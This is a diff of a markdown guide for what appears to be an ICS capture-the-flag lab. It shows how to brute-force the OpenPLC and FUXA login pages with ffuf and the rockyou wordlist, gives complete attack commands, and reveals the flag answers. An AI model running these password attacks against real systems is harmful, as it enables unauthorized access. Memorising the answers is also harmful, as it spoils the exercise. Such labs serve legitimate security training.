@@ -1,78 +1,89 @@
-# Password attack
+# 🔑 Password Attack Guide
+
+## 📋 Overview
 A dictionary attack is a common method used to crack passwords by systematically attempting all the words in a pre-defined list, or "dictionary," until the correct one is found.
 This type of attack leverages the tendency of users to choose simple, common passwords, such as "password," "123456," or "qwerty." By using a comprehensive dictionary that includes common words, phrases, and variations, attackers can quickly break into accounts that are protected by weak or predictable passwords.
 
-## Password attack on OpenPLC
-In this example we try to get the password of the openplc login using the password fuzzer [ffuf](https://github.com/ffuf/ffuf).  
+## 🎯 OpenPLC Password Attack
+In this example we try to get the password of the OpenPLC login using the password fuzzer [ffuf](https://github.com/ffuf/ffuf).
 
-### Check response
-OpenPLC is running at [http://<DEVICE_IP>:8080/login](http://<DEVICE_IP>:8080/login]).
+### 🔍 Analyzing the Target
+OpenPLC is running at [http://<DEVICE_IP>:8080/login](http://<DEVICE_IP>:8080/login).
 After entering wrong credentials, this page is displayed:  
-![bad credentials](doc/wrong_login.png)
+![Bad Credentials](doc/wrong_login.png)
 
-When the browsers built in developer console is open during the request, we can see the what is sent and received when we try to login. E.g. in chrome with F12  
-![login request](doc/login_request.png)
+When the browser's built-in developer console is open during the request, we can see what is sent and received when we try to login (e.g., in Chrome with F12):  
+![Login Request](doc/login_request.png)
 
-And the sent payload  
-![login payload](doc/login_payload.png)
+And the sent payload:  
+![Login Payload](doc/login_payload.png)
 
-### Download
-```sh
-mkdir ~/ffuf
-cd ~/ffuf
-wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
-tar xf ffuf_2.1.0_linux_amd64.tar.gz
-```
+### 🛠️ Setup Steps
+1. Download ffuf:
+   ```sh
+   mkdir ~/ffuf
+   cd ~/ffuf
+   wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
+   tar xf ffuf_2.1.0_linux_amd64.tar.gz
+   ```
 
-### Get a wordlist
-```sh
-wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-```
+2. Get a wordlist:
+   ```sh
+   wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+   ```
 
-### ffuf
-Start fuff with:
-- `-w ./rockyou.txt` the downloaded wordlist
-- `-X POST -H "Content-Type: application/x-www-form-urlencoded"` information from the login request
-- `-d "username=admin&password=FUZZ"` information form the login request payload (FUZZ is replaced by ffuf)
-- `-u http://$DEVICE_IP:8080/login` the request
-- `-fs 4561` the length of the response on wrong login
+### 🚀 Running the Attack
+Start ffuf with:
+- `-w ./rockyou.txt`: The downloaded wordlist
+- `-X POST -H "Content-Type: application/x-www-form-urlencoded"`: Information from the login request
+- `-d "username=admin&password=FUZZ"`: Information from the login request payload (FUZZ is replaced by ffuf)
+- `-u http://$DEVICE_IP:8080/login`: The request URL
+- `-fs 4561`: The length of the response on wrong login
+
 ```sh
 ./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -raw -u http://$DEVICE_IP:8080/login -fs 4561
 ```
 
-For more info start it without parameters
+For more info, start it without parameters:
 ```sh
 ./ffuf
 ```
 
-### Find the flag
-The flag has the format "CybICS(flag)".
+## 🎯 Find the Flag
+The flag has the format `CybICS(flag)`.
 
-**Hint**: The flag is part of the user information.
+**💡 Hint**: The flag is part of the user information.
+
 <details>
-  <summary><strong><span style="color:orange;font-weight: 900">Solution</span></strong></summary>
+  <summary><strong><span style="color:orange;font-weight: 900">🔍 Solution</span></strong></summary>
   
-  ##
-  :anger: Flag: CybICS(0penPLC)
+  <div style="color:orange;font-weight: 900">
+    🚩 Flag: CybICS(0penPLC)
+  </div>
+  
   ![Flag OpenPLC Password](doc/flag.png)
 </details>
 
-## Password attack on FUXA
+## 🎯 FUXA Password Attack
 Use the previous knowledge to fuzz the admin login of FUXA.
-FUXA is running at [http://<DEVICE_IP>:1881](http://<DEVICE_IP>:1881). 
+FUXA is running at [http://<DEVICE_IP>:1881](http://<DEVICE_IP>:1881).
 
-### Find the flag
-The flag has the format "CybICS(flag)".
+### 🎯 Find the Flag
+The flag has the format `CybICS(flag)`.
 
-**Hint**: The flag appears after successful login on the HMI.
+**💡 Hint**: The flag appears after successful login on the HMI.
+
 <details>
-  <summary><strong><span style="color:orange;font-weight: 900">Solution</span></strong></summary>
+  <summary><strong><span style="color:orange;font-weight: 900">🔍 Solution</span></strong></summary>
   
-```sh
-./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
-```
+  Run the attack:
+  ```sh
+  ./ffuf -v -w ./rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
+  ```
 
-
-  :anger: Flag: CybICS(FU##A)
+  <div style="color:orange;font-weight: 900">
+    🚩 Flag: CybICS(FU##A)
+  </div>
+  
   ![Flag FUXA Password](doc/flag2.png)
 </details>
